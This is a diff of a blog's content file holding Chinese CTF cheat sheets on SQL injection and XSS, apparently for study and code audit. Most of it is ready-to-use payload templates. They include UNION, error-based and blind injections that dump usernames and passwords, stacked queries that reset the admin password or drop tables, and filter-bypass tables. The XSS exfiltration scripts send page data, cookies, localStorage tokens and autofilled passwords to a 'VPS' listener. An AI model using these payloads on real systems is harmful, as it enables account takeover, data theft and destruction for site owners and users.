-注入模板-- ===== 报错注入（PROCEDURE ANALYSE） =====-- 查库名?page=1 PROCEDURE ANALYSE(extractvalue(1,concat(0x7e,database())),1)--+-- 查表名?page=1 PROCEDURE ANALYSE(extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))),1)--+-- 显示不全?page=1 PROCEDURE ANALYSE(extractvalue(1,concat(0x7e,substr((select group_concat(flag) from flag),1,32))),1)--+-- ===== 联合注入（后面无 ORDER BY 时） =====?page=1 UNION SELECT 1,2,3--+-- ===== 时间盲注 =====?page=1 and sleep(5)--+
-
-
-过滤绕过速查
-
-
-过滤
-绕过
-示例
-
-
-
-逗号 ,
-OFFSET 语法
-LIMIT 10 OFFSET 1
-
-
-数字
-运算代替
-1+1 2*1
-
-
-PROCEDURE
-换 UNION 或盲注
-换注入方式
-
-
-
-6. IN 注入原理：IN (...) 括号内参数用户可控，直接拼接。
-代码特征：参数在 IN (...) 括号内。
-$sql = &quot;SELECT * FROM users WHERE id IN (&#123;$_GET[&#x27;ids&#x27;]&#125;)&quot;;
-
-危险函数：
-mysqli_query($conn, $sql)
-
-
-注入模板-- ① 闭合测试?ids=1) and 1=1--+-- ② 查库名?ids=1) and 1=2 union select 1,database(),3--+-- ③ 查表名?ids=1) and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+-- ④ 查列名?ids=1) and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;表名&#x27;--+-- ⑤ 拿数据?ids=1) and 1=2 union select 1,group_concat(username,0x3a,password),3 from users--+
-
-
-过滤绕过速查
-
-
-过滤
-绕过
-说明
-
-
-
-逗号
-UNION 逐行查
-不用 group_concat
-
-
-括号
-OR 条件代替
-id=1 OR 1=2 UNION SELECT...
-
-
-空格&#x2F;关键字
-同数字型
-双写、大小写
-
-
-
-7. INSERT &#x2F; UPDATE &#x2F; DELETE 注入原理：增删改语句中存在注入，通常用报错注入或时间盲注。
-代码特征：INSERT &#x2F; UPDATE &#x2F; DELETE 语句中直接拼接用户输入。
-// INSERT$sql = &quot;INSERT INTO users(username,password) VALUES (&#x27;&#123;$_POST[&#x27;user&#x27;]&#125;&#x27;,&#x27;&#123;$_POST[&#x27;pass&#x27;]&#125;&#x27;)&quot;;// UPDATE$sql = &quot;UPDATE users SET password=&#x27;&#123;$_POST[&#x27;pass&#x27;]&#125;&#x27; WHERE id=&#123;$_GET[&#x27;id&#x27;]&#125;&quot;;// DELETE$sql = &quot;DELETE FROM users WHERE id=&#123;$_GET[&#x27;id&#x27;]&#125;&quot;;
-
-危险函数：
-mysqli_query($conn, $sql)mysqli_multi_query($conn, $sql)   // 支持堆叠
-
-
-注入模板-- ===== 报错注入（首选） =====-- 查库名username=admin&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)#-- 查表名username=admin&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#-- 查列名username=admin&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;表名&#x27;),0x7e),1)#-- 拿数据username=admin&#x27; and updatexml(1,concat(0x7e,(select group_concat(flag) from flag),0x7e),1)#-- 显示不全username=admin&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(flag) from flag),1,32),0x7e),1)#-- ===== 时间盲注（无报错时用） =====username=admin&#x27; and if(1=1,sleep(5),0)#
-
-
-过滤绕过速查同字符型注入。重点：单引号→宽字节&#x2F;十六进制，关键字→双写&#x2F;大小写，updatexml→extractvalue&#x2F;floor。
-
-8. 堆叠注入原理：数据库支持多语句执行，用 ; 分隔执行多条 SQL。
-代码特征：使用支持多语句执行的函数。
-mysqli_multi_query($conn, $sql);
-
-PDO 默认不支持，需 PDO::ATTR_EMULATE_PREPARES =&gt; true。
-危险函数：
-mysqli_multi_query($conn, $sql)
-
-
-注入模板-- 查库?id=1;show databases;-- 查表?id=1;use 库名;show tables;-- 查当前库的表1&#x27;;show tables;-- 查列?id=1;show columns from 表名;?id=1;use 库名;show columns from 表名;-- 查内容（handler 绕过 select 过滤）?id=1;use 库名;handler 表名 open;handler 表名 read first;-- 改数据（最常用）?id=1;update users set password=&#x27;123456&#x27; where username=&#x27;admin&#x27;;-- 删数据?id=1;delete from users where id=1;-- 删表?id=1;drop table 表名;-- 查当前用户/版本?id=1;select user();?id=1;select version();
-
-
-过滤绕过速查
-
-
-过滤
-绕过
-说明
-
-
-
-分号 ;
-过滤了就没了，换报错&#x2F;盲注
-堆叠全靠分号
-
-
-select
-用 show 代替查tables
-show tables
-
-
-select
-handler  查内容
-handler 表名 open;handler 表名 read first;
-
-
-
-9. 二次注入原理：输入入库时转义了，出库取出后直接拼 SQL，反斜杠消失，触发注入。
-代码特征：入库有过滤，出库直接拼 SQL。
-// 入库时转义（看似安全）$username = addslashes($_POST[&#x27;username&#x27;]);$sql = &quot;INSERT INTO users(username) VALUES (&#x27;$username&#x27;)&quot;;// 出库时直接拼（实际危险）$row = mysqli_fetch_assoc($result);$sql2 = &quot;SELECT * FROM users WHERE username = &#x27;&#123;$row[&#x27;username&#x27;]&#125;&#x27;&quot;;
-
-危险函数：
-addslashes()          // 入库时用的，出库后反斜杠没了mysqli_query()        // 出库后拼 SQL 执行
-
-
-注入模板-- ===== 第一步：注册带注入的账号 =====username=admin&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)#password=123456-- ===== 第二步：触发注入（登录/修改密码/查询等） =====-- 用刚才注册的账号登录，出库时拼 SQL 自动触发username=admin&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)#password=123456
-
-
-触发点取决于业务：修改密码、个人信息查询、留言展示等，只要从数据库取出来拼 SQL 的地方都能触发。
-
-
-过滤绕过速查
-
-
-过滤
-绕过
-说明
-
-
-
-入库 addslashes
-没用，出库反斜杠就没了
-二次注入核心就是绕这个
-
-
-出库也转义
-那就安全了
-但很少有开发这么做
-
-
-关键字过滤
-同字符型绕过
-双写、大小写
-
-
-
-10. Cookie &#x2F; Header 注入原理：注入点在 Cookie 或 HTTP 请求头中，开发只过滤了 GET&#x2F;POST。
-代码特征：参数来源是 $_COOKIE 或 $_SERVER。
-// Cookie 注入$id = $_COOKIE[&#x27;id&#x27;];$sql = &quot;SELECT * FROM users WHERE id = $id&quot;;// UA 注入$ua = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];$sql = &quot;INSERT INTO log(ua) VALUES (&#x27;$ua&#x27;)&quot;;// XFF 注入$ip = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];$sql = &quot;INSERT INTO log(ip) VALUES (&#x27;$ip&#x27;)&quot;;
-
-危险函数：
-mysqli_query($conn, $sql)
-
-
-注入模板-- ===== Cookie 注入 =====Cookie: id=1 and 1=2 union select 1,database(),3--+-- ===== UA 注入 =====User-Agent: &#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)#-- ===== X-Forwarded-For 注入 =====X-Forwarded-For: 127.0.0.1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)#-- ===== Referer 注入 =====Referer: &#x27; and 1=2 union select 1,database(),3--+
-
-
-过滤绕过速查
-
-
-过滤
-绕过
-说明
-
-
-
-只过滤 GET&#x2F;POST
-换 Cookie&#x2F;Header 注入
-审计最容易漏的地方
-
-
-IP 格式校验
-XFF 多个 IP 逗号分隔
-127.0.0.1, &#39;注入语句&#39;
-
-
-Cookie 编码
-URL 编码后再传
-看后端有没有 urldecode
-
-
-
-11. 宽字节注入原理：数据库用 GBK 等宽字节编码，addslashes() 转义的 \&#39; 被 %df 吃掉变成汉字，单引号逃逸。
-代码特征：有转义 + 数据库宽字节编码 + 没设正确连接字符集。
-$id = addslashes($_GET[&#x27;id&#x27;]);$sql = &quot;SELECT * FROM users WHERE id = &#x27;$id&#x27;&quot;;// 数据库字符集：GBK / gbk / gb2312
-
-危险函数：
-addslashes()                      // 转义函数mysql_query() / mysqli_query()    // 执行 SQL
-
-
-注入模板-- ① 测试闭合?id=1%df&#x27; and 1=1--+?id=1%df&#x27; and 1=2--+-- ② 查库名?id=-1%df&#x27; union select 1,database(),3--+-- ③ 查表名?id=-1%df&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+-- ④ 查列名（表名用十六进制，避免单引号）?id=-1%df&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273--+-- ⑤ 拿数据?id=-1%df&#x27; union select 1,group_concat(username,0x3a,password),3 from users--+-- ⑥ 显示不全?id=-1%df&#x27; union select 1,substr(group_concat(flag),1,32),3 from flag--+
-
-
-过滤绕过速查
-
-
-过滤
-绕过
-说明
-
-
-
-addslashes()
-%df&#39; 宽字节
-核心绕过方式
-
-
-mysql_real_escape_string()
-没设 mysql_set_charset(&#39;gbk&#39;) 也能绕
-设了就安全了
-
-
-单引号
-十六进制字符串
-table_name=0x7573657273
-
-
-空格&#x2F;关键字
-同字符型
-双写、大小写
-
-
-
-附录：黑名单函数替代速查表
-
-
-被过滤
-替代方案
-
-
-
-updatexml
-extractvalue() floor() exp()
-
-
-extractvalue
-updatexml() floor()
-
-
-floor
-updatexml() extractvalue()
-
-
-sleep
-benchmark(10000000,md5(1))
-
-
-if
-case when ... then ... end elt() field()
-
-
-substr
-mid() substring() left() right()
-
-
-group_concat
-concat_ws() + limit 逐行
-
-
-concat
-concat_ws() group_concat()
-
-
-union select
-报错注入、盲注、/*!union*/ /*!select*/
-
-
-information_schema
-sys.schema_auto_increment_columns mysql.innodb_table_stats
-
-
-and
-&amp;&amp; anAndd 双写
-
-
-or
-oorr 双写
-
-
-select
-大小写 SeLeCt 双写 selselectect
-
-
-from
-双写 frfromom
-
-
-where
-双写 whwhereere
-
-
-order by
-group by
-
-
-空格
-/**/ %09 %0a %0d %a0 括号 ()
-
-
-逗号 ,
-from x for y join offset
-
-
-等号 &#x3D;
-like regexp &gt; &lt; !=
-
-
-注释 # –
-;%00 /*...*/
-
-
-单引号 ‘
-宽字节 %df&#39; 十六进制 0x...
-
-
-百分号 %
-_ 匹配单字符
-
-
-limit
-limit 1 offset 0
-
-
-
-审计速记口诀
-找输入 → 找 SQL → 看拼接 → 判类型 → 测过滤 → 选姿势
-有回显用联合，有报错用报错，都没有用盲注
-90% 的注入出在 order by、like、in、数字型无过滤这四个地方
 
 ]]></content>
       <categories>
@@ -11470,6 +10862,256 @@ ssti详解与例题以及绕过payload大全https://blog.csdn.net/weixin_5451583
       </tags>
   </entry>
   <entry>
+    <title>XSS 跨站脚本攻击</title>
+    <url>/2026/08/24/xss/</url>
+    <content><![CDATA[1. 一句话本质用户的输入被浏览器当成「代码」执行，而不是「纯文本」显示。本质是打破输入与输出的信任边界，浏览器无法区分恶意与正常脚本。
+
+CTF 识别信号：源码里出现 bot &#x2F; puppeteer &#x2F; headless &#x2F; chromium 关键词 → 99% 考 XSS。bot 的作用就是模拟管理员访问页面，触发你的 XSS。
+外带 &#x3D; 让 bot 的浏览器（在 admin 会话里）主动把读到的数据，当成一个「请求」发到你自己的服务器上。
+
+2. 代码特征（看到&#x3D;有洞）特征 A：后端输出到 HTML 没转义
+
+
+危险写法
+说明
+
+
+
+&#96;{{ x
+safe }}&#96;
+
+
+{% autoescape false %}
+整块关转义
+
+
+render_template_string(f&quot;...{u}&quot;)
+字符串拼接模板
+
+
+echo $GET[&#39;x&#39;]（PHP）
+直接输出
+
+
+&lt;%= param %&gt;（JSP）
+直接输出
+
+
+手拼 HTML 字符串再输出
+无转义
+
+
+特征 B：前端把数据塞进「能执行 &#x2F; 能解析 HTML」的 API
+解析 HTML：innerHTML &#x2F; outerHTML &#x2F; document.write &#x2F; insertAdjacentHTML &#x2F; jQuery .html() &#x2F; Vue v-html &#x2F; React dangerouslySetInnerHTML
+执行字符串：eval() &#x2F; Function() &#x2F; setTimeout(&quot;str&quot;) &#x2F; setInterval(&quot;str&quot;)
+跳转&#x2F;加载：location.href= &#x2F; location.replace() &#x2F; window.open() &#x2F; iframe.src=
+安全对照：textContent &#x2F; .text()
+
+特征 C：三个助推漏洞
+无 CSP，或 script-src &#39;unsafe-inline&#39;
+Cookie 无 HttpOnly（XSS 可偷 session）
+只过滤不转义（过滤可绕过：大小写&#x2F;编码&#x2F;双写）
+
+容易漏的 sink
+javascript: 伪协议（&lt;a href&gt;、&lt;img src&gt;、&lt;iframe src&gt;）
+srcdoc、&lt;meta http-equiv=&quot;refresh&quot;&gt;、&lt;object data&gt;、&lt;embed src&gt;
+postMessage 的 onmessage 回调里直接 innerHTML &#x2F; eval（payload 不进服务端日志）
+CSS style 属性 &#x2F; &lt;style&gt; 里的 expression()
+
+3. 审计路径（source→sink）
+找 Sink（出口）：grep innerHTML &#x2F; document.write &#x2F; eval &#x2F; |safe &#x2F; echo $
+追 Source：数据来自 URL 参数 &#x2F; 表单 &#x2F; Cookie &#x2F; 存储（数据库）？
+判定：Source 可控（用户输入）+ Sink 未转义 → 漏洞成立
+
+
+存储型 XSS 是跨文件污点追踪：输入 → [存库代码] → 数据库 → [渲染代码] → 浏览器。要同时盯写库和渲染两端——很多项目写库时过滤了、渲染时没转义，或反之；只要一端不设防即可利用。
+
+4. 白盒验证
+追数据流：确认 source 可控、sink 未转义
+查兜底：是否有 CSP &#x2F; 全局过滤 &#x2F; sanitizer
+确认注入点上下文（HTML 内容区 &#x2F; 属性值 &#x2F; script 内）→ 决定 payload 写法
+
+5. 黑盒验证① 输入 &#39;&quot;&gt;&lt;svg onload=alert(1)&gt;② 查看源码：输入出现在哪？被转义了吗？③ 按回显位置换 payload：
+
+
+
+回显位置
+payload
+
+
+
+直接出现在 HTML 内容区
+&lt;img src=x onerror=alert(1)&gt;
+
+
+出现在 value=&quot;★&quot; 里
+&quot;&gt;&lt;img src=x onerror=alert(1)&gt;
+
+
+出现在 &lt;script&gt;var x=&#39;★&#39;&lt;/script&gt;
+&#39;;alert(1);//
+
+
+出现在 &lt;a href=&quot;★&quot;&gt;
+javascript:alert(1)
+
+
+被转义成 &amp;lt;
+尝试解码绕过（编码&#x2F;大小写&#x2F;双写）
+
+
+④ 弹了 → 判断反射&#x2F;存储 → 换成外带版
+6. 利用与打法
+
+
+类型
+数据路径
+特点
+
+
+
+反射型
+输入→服务器→原样响应→浏览器执行
+不存储，需受害者点链接（CTF 配 bot）
+
+
+存储型
+输入→存库→渲染→浏览器
+永久存储，bot 正常访问就被打，危害最大
+
+
+DOM XSS
+URL 参数&#x2F;hash→前端 JS→写 DOM
+不经过服务器拼接，payload 不在响应 HTML 里
+
+
+外带思路：让 bot 的浏览器（admin 会话）把读到的数据发到你的 VPS：触发 XSS → fetch 目标数据 → new Image().src=你的VPS → VPS 解码
+7. Payload 模板通用外带（一步）&lt;script&gt;fetch(&quot;目标URL&quot;).then(r=&gt;r.text()).then(t=&gt;&#123;  new Image().src=&quot;http://你的VPS:8080/?d=&quot;+encodeURIComponent(t);&#125;);&lt;/script&gt;
+
+通用外带（两步：先拿 ID 再读详情）&lt;script&gt;fetch(&quot;列表页URL&quot;).then(r=&gt;r.text()).then(h=&gt;&#123;  let id=h.split(&quot;分隔符&quot;)[1].substring(0,ID长度);  fetch(&quot;详情页URL&quot;+id).then(r=&gt;r.text()).then(t=&gt;&#123;    new Image().src=&quot;http://VPS:8080/?d=&quot;+encodeURIComponent(t);  &#125;);&#125;);&lt;/script&gt;
+
+遍历多个 ID&lt;script&gt;t.split(&quot;分隔符&quot;).slice(1).forEach(p=&gt;&#123;  let id=p.substring(0,40);  fetch(&quot;详情页URL&quot;+id).then(r=&gt;r.text()).then(t=&gt;&#123;    new Image().src=&quot;http://VPS:8080/?d=&quot;+encodeURIComponent(t);  &#125;);&#125;);&lt;/script&gt;
+
+读什么数据的变体
+
+
+目标
+代码
+
+
+
+页面文本
+fetch(url).then(r=&gt;r.text())
+
+
+JSON 接口
+fetch(url).then(r=&gt;r.text())（text 够用）
+
+
+Cookie
+new Image().src=&quot;http://VPS:8080/?d=&quot;+encodeURIComponent(document.cookie)
+
+
+localStorage
+...encodeURIComponent(localStorage.getItem(&quot;token&quot;))
+
+
+整份 DOM
+...encodeURIComponent(document.documentElement.outerHTML)
+
+
+自动填充密码
+...document.querySelector(&quot;input[type=password]&quot;).value
+
+
+当前页 URL
+...location.href
+
+
+注入点特殊情况
+
+
+情况
+约束
+对策
+
+
+
+A：二次转义（repr&#x2F;JSON）
+禁单引号、禁反斜杠
+payload 全用双引号；用 h.split(&quot;/s/&quot;)[1] 不用正则
+
+
+B：HTML 属性里
+不能有 &quot;（会闭合属性）
+用 &amp;#39;/&amp;quot; 或反引号，payload 用 &#39;...&#39;
+
+
+C：&lt;script&gt; 标签内
+防 &lt;/script&gt; 提前闭合
+&lt;/script&gt;&lt;script&gt;fetch(...)&lt;/script&gt;
+
+
+服务器监听python3 -m http.server 8080
+
+8. 绕过
+
+
+被过滤的东西
+绕过
+
+
+
+空格（属性分隔）
+&lt;script&gt;alert(1)&lt;/script&gt;（标签内直接写 JS）；&lt;svg onload&gt;、&lt;details open ontoggle&gt;
+
+
+点号（属性访问）
+fetch(&quot;/&quot;)[&quot;then&quot;](function(r){return r[&quot;text&quot;]()})
+
+
+单引号
+改用双引号 fetch(&quot;/&quot;)
+
+
+URL 中的点号
+十六进制 IP：http://192.168.1.100 → http://0xc0a80164
+
+
+return 后需要空格
+return(fetch(&quot;/&quot;))；箭头函数 r=&gt;r[&quot;text&quot;]()
+
+
+标签被过滤
+换标签&#x2F;事件：&lt;svg onload&gt;、&lt;img src=x onerror&gt;、&lt;details open ontoggle&gt;
+
+
+大小写过滤
+&lt;ScRiPt&gt;、JaVaScRiPt:
+
+
+javascript: 被滤
+java\nscript:、HTML 实体 &amp;#106;avascript:
+
+
+关键字被滤
+字符串拼接 alert、top[&#39;alert&#39;](1)、window[&#39;al&#39;+&#39;ert&#39;]
+
+
+alert 被滤
+confirm(1)、prompt(1)、print()
+
+
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>XSS</tag>
+        <tag>跨站脚本</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XSS Writeup</title>
     <url>/2026/08/24/xss-wp/</url>
     <content><![CDATA[XSS大闯关(level_1—20)
@@ -11723,253 +11365,611 @@ _定时任务提权定时任务（cron job）是 Linux 系统中用于定期执�
       </tags>
   </entry>
   <entry>
-    <title>XSS 跨站脚本攻击</title>
-    <url>/2026/08/24/xss/</url>
-    <content><![CDATA[1. 一句话本质用户的输入被浏览器当成「代码」执行，而不是「纯文本」显示。本质是打破输入与输出的信任边界，浏览器无法区分恶意与正常脚本。
+    <title>SQL 注入类型</title>
+    <url>/2026/08/24/sql-injection-types/</url>
+    <content><![CDATA[1. 数字型注入原理：参数为数字直接拼 SQL，无引号包裹，输入 &#39; 直接报错。
+代码特征：参数直接拼接，无任何引号包裹。
+$sql = &quot;SELECT * FROM users WHERE id = &quot;.$_GET[&#x27;id&#x27;];
 
-CTF 识别信号：源码里出现 bot &#x2F; puppeteer &#x2F; headless &#x2F; chromium 关键词 → 99% 考 XSS。bot 的作用就是模拟管理员访问页面，触发你的 XSS。
-外带 &#x3D; 让 bot 的浏览器（在 admin 会话里）主动把读到的数据，当成一个「请求」发到你自己的服务器上。
-
-2. 代码特征（看到&#x3D;有洞）特征 A：后端输出到 HTML 没转义
+危险函数：
+mysqli_query($conn, $sql)    // MySQLi 过程化$pdo-&gt;query($sql)            // PDOmysql_query($sql)            // 老版本 MySQL 扩展
 
 
-危险写法
+注入模板-- ① 判断列数?id=1 order by 3--+-- ② 判断回显位?id=-1 union select 1,2,3--+-- ③ 查库名?id=-1 union select 1,database(),3--+-- ④ 查表名?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+?id=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1--+-- ⑤ 查列名?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;表名&#x27;--+?id=-1 union select 1,column_name,3 from information_schema.columns where table_name=&#x27;表名&#x27; limit 0,1--+-- ⑥ 拿数据?id=-1 union select 1,group_concat(username,0x3a,password),3 from 表名--+?id=-1 union select 1,concat(username,0x3a,password),3 from 表名 limit 0,1--+-- ⑦ 显示不全（substr 分段读，每段32位）?id=-1 union select 1,substr(group_concat(flag),1,32),3 from flag--+?id=-1 union select 1,substr(group_concat(flag),33,32),3 from flag--+
+
+
+过滤绕过速查
+
+
+过滤
+绕过
+示例
+
+
+
+空格
+/**/ %09 %0a 括号
+?id=1/**/union/**/select/**/1,2,3--+
+
+
+union select
+双写、内联注释、换行
+?id=1 ununionion seselectlect 1,2,3--+
+
+
+and &#x2F; or
+&amp;&amp;、 双写
+?id=1 &amp;&amp; 1=1 ?id=1 anAndd 1=1
+
+
+单引号
+十六进制字符串
+table_name=0x7573657273
+
+
+等号 &#x3D;
+like regexp &gt; &lt;
+?id=1 and 1 like 1--+
+
+
+注释 # –
+;%00 闭合后引号
+?id=1 union select 1,2,3;%00
+
+
+逗号 ,
+from x for y join
+substr((select database())from 1 for 1)
+
+
+sleep
+benchmark()
+and benchmark(10000000,md5(1))--+
+
+
+information_schema
+sys.schema_auto_increment_columns
+select table_name from sys.schema_auto_increment_columns
+
+
+order by
+group by
+?id=1 group by 3--+
+
+
+
+2. 字符型注入原理：参数用单&#x2F;双引号包裹，需闭合引号再注入。
+代码特征：参数被单引号或双引号包裹。
+$sql = &quot;SELECT * FROM users WHERE username = &#x27;&#123;$_GET[&#x27;user&#x27;]&#125;&#x27;&quot;;$sql = &quot;select passwd from user where username=&#x27;&quot;.$username.&quot;&#x27; order by id limit 1;&quot;;
+
+危险函数：
+mysqli_query($conn, $sql)$pdo-&gt;query($sql)
+
+
+注入模板-- ① 判断列数?user=admin&#x27; order by 3--+-- ② 判断回显位?user=admin&#x27; and 1=2 union select 1,2,3--+-- ③ 查库名?user=admin&#x27; and 1=2 union select 1,database(),3--+-- ④ 查表名?user=admin&#x27; and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+?user=admin&#x27; and 1=2 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1--+-- ⑤ 查列名?user=admin&#x27; and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;表名&#x27;--+-- ⑥ 拿数据?user=admin&#x27; and 1=2 union select 1,group_concat(username,0x3a,password),3 from users--+-- ⑦ 显示不全?user=admin&#x27; and 1=2 union select 1,substr(group_concat(flag),1,32),3 from flag--+
+
+
+过滤绕过速查
+
+
+过滤
+绕过
+示例
+
+
+
+单引号
+宽字节 %df&#39; 十六进制
+?id=1%df&#39; union select 1,2,3--+
+
+
+addslashes()
+宽字节、二次注入
+%df&#39; 吃反斜杠
+
+
+双引号
+先闭合双引号
+?user=admin&quot; and 1=2 union select 1,2,3--+
+
+
+空格&#x2F;关键字
+同数字型
+双写、大小写、注释
+
+
+
+3. 搜索型注入（LIKE）原理：用户输入拼入 LIKE &#39;%...%&#39;，开发以为有 % 包裹就安全。
+代码特征：参数在 &#39;%...%&#39; 中间。
+$sql = &quot;SELECT * FROM users WHERE name LIKE &#x27;%&#123;$_GET[&#x27;kw&#x27;]&#125;%&#x27;&quot;;
+
+危险函数：
+mysqli_query($conn, $sql)
+
+
+注入模板-- ① 闭合测试?kw=%&#x27; and 1=1--+?kw=%&#x27; and 1=2--+-- ② 查库名?kw=%&#x27; and 1=2 union select 1,database(),3--+-- ③ 查表名?kw=%&#x27; and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+-- ④ 查列名?kw=%&#x27; and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;表名&#x27;--+-- ⑤ 拿数据?kw=%&#x27; and 1=2 union select 1,group_concat(username,0x3a,password),3 from users--+-- ⑥ 显示不全?kw=%&#x27; and 1=2 union select 1,substr(group_concat(flag),1,32),3 from flag--+
+
+
+过滤绕过速查
+
+
+过滤
+绕过
 说明
 
 
 
-&#96;{{ x
-safe }}&#96;
+单引号
+宽字节 %df%25&#39;
+% 也要考虑编码
 
 
-{% autoescape false %}
-整块关转义
+百分号 %
+_ 匹配单字符
+LIKE &#39;_dmin&#39;
 
 
-render_template_string(f&quot;...{u}&quot;)
-字符串拼接模板
+空格&#x2F;关键字
+同字符型
+双写、大小写
 
 
-echo $GET[&#39;x&#39;]（PHP）
-直接输出
 
+4. 排序注入（ORDER BY）原理：ORDER BY 后字段名用户可控，无法预编译，开发直接拼接。重灾区。
+代码特征：参数在 ORDER BY 后面，通常是排序字段或排序方式。
+$sql = &quot;SELECT * FROM users ORDER BY &#123;$_GET[&#x27;sort&#x27;]&#125;&quot;;
 
-&lt;%= param %&gt;（JSP）
-直接输出
+危险函数：
+mysqli_query($conn, $sql)
 
 
-手拼 HTML 字符串再输出
-无转义
+注入模板-- ===== 报错注入（首选） =====-- 查库名?sort=updatexml(1,concat(0x7e,database(),0x7e),1)-- 查表名?sort=updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)-- 查列名?sort=updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;表名&#x27;),0x7e),1)-- 拿数据?sort=updatexml(1,concat(0x7e,(select group_concat(flag) from flag),0x7e),1)-- 显示不全?sort=updatexml(1,concat(0x7e,substr((select group_concat(flag) from flag),1,32),0x7e),1)-- ===== 布尔盲注（无报错时用） =====-- 库名长度?sort=if(length(database())=8,id,username)-- 逐字猜库名?sort=if(ascii(substr(database(),1,1))=115,id,username)-- ===== 时间盲注 =====?sort=if(1=1,sleep(5),id)
 
 
-特征 B：前端把数据塞进「能执行 &#x2F; 能解析 HTML」的 API
-解析 HTML：innerHTML &#x2F; outerHTML &#x2F; document.write &#x2F; insertAdjacentHTML &#x2F; jQuery .html() &#x2F; Vue v-html &#x2F; React dangerouslySetInnerHTML
-执行字符串：eval() &#x2F; Function() &#x2F; setTimeout(&quot;str&quot;) &#x2F; setInterval(&quot;str&quot;)
-跳转&#x2F;加载：location.href= &#x2F; location.replace() &#x2F; window.open() &#x2F; iframe.src=
-安全对照：textContent &#x2F; .text()
+过滤绕过速查
 
-特征 C：三个助推漏洞
-无 CSP，或 script-src &#39;unsafe-inline&#39;
-Cookie 无 HttpOnly（XSS 可偷 session）
-只过滤不转义（过滤可绕过：大小写&#x2F;编码&#x2F;双写）
 
-容易漏的 sink
-javascript: 伪协议（&lt;a href&gt;、&lt;img src&gt;、&lt;iframe src&gt;）
-srcdoc、&lt;meta http-equiv=&quot;refresh&quot;&gt;、&lt;object data&gt;、&lt;embed src&gt;
-postMessage 的 onmessage 回调里直接 innerHTML &#x2F; eval（payload 不进服务端日志）
-CSS style 属性 &#x2F; &lt;style&gt; 里的 expression()
-
-3. 审计路径（source→sink）
-找 Sink（出口）：grep innerHTML &#x2F; document.write &#x2F; eval &#x2F; |safe &#x2F; echo $
-追 Source：数据来自 URL 参数 &#x2F; 表单 &#x2F; Cookie &#x2F; 存储（数据库）？
-判定：Source 可控（用户输入）+ Sink 未转义 → 漏洞成立
-
-
-存储型 XSS 是跨文件污点追踪：输入 → [存库代码] → 数据库 → [渲染代码] → 浏览器。要同时盯写库和渲染两端——很多项目写库时过滤了、渲染时没转义，或反之；只要一端不设防即可利用。
-
-4. 白盒验证
-追数据流：确认 source 可控、sink 未转义
-查兜底：是否有 CSP &#x2F; 全局过滤 &#x2F; sanitizer
-确认注入点上下文（HTML 内容区 &#x2F; 属性值 &#x2F; script 内）→ 决定 payload 写法
-
-5. 黑盒验证① 输入 &#39;&quot;&gt;&lt;svg onload=alert(1)&gt;② 查看源码：输入出现在哪？被转义了吗？③ 按回显位置换 payload：
-
-
-
-回显位置
-payload
-
-
-
-直接出现在 HTML 内容区
-&lt;img src=x onerror=alert(1)&gt;
-
-
-出现在 value=&quot;★&quot; 里
-&quot;&gt;&lt;img src=x onerror=alert(1)&gt;
-
-
-出现在 &lt;script&gt;var x=&#39;★&#39;&lt;/script&gt;
-&#39;;alert(1);//
-
-
-出现在 &lt;a href=&quot;★&quot;&gt;
-javascript:alert(1)
-
-
-被转义成 &amp;lt;
-尝试解码绕过（编码&#x2F;大小写&#x2F;双写）
-
-
-④ 弹了 → 判断反射&#x2F;存储 → 换成外带版
-6. 利用与打法
-
-
-类型
-数据路径
-特点
-
-
-
-反射型
-输入→服务器→原样响应→浏览器执行
-不存储，需受害者点链接（CTF 配 bot）
-
-
-存储型
-输入→存库→渲染→浏览器
-永久存储，bot 正常访问就被打，危害最大
-
-
-DOM XSS
-URL 参数&#x2F;hash→前端 JS→写 DOM
-不经过服务器拼接，payload 不在响应 HTML 里
-
-
-外带思路：让 bot 的浏览器（admin 会话）把读到的数据发到你的 VPS：触发 XSS → fetch 目标数据 → new Image().src=你的VPS → VPS 解码
-7. Payload 模板通用外带（一步）&lt;script&gt;fetch(&quot;目标URL&quot;).then(r=&gt;r.text()).then(t=&gt;&#123;  new Image().src=&quot;http://你的VPS:8080/?d=&quot;+encodeURIComponent(t);&#125;);&lt;/script&gt;
-
-通用外带（两步：先拿 ID 再读详情）&lt;script&gt;fetch(&quot;列表页URL&quot;).then(r=&gt;r.text()).then(h=&gt;&#123;  let id=h.split(&quot;分隔符&quot;)[1].substring(0,ID长度);  fetch(&quot;详情页URL&quot;+id).then(r=&gt;r.text()).then(t=&gt;&#123;    new Image().src=&quot;http://VPS:8080/?d=&quot;+encodeURIComponent(t);  &#125;);&#125;);&lt;/script&gt;
-
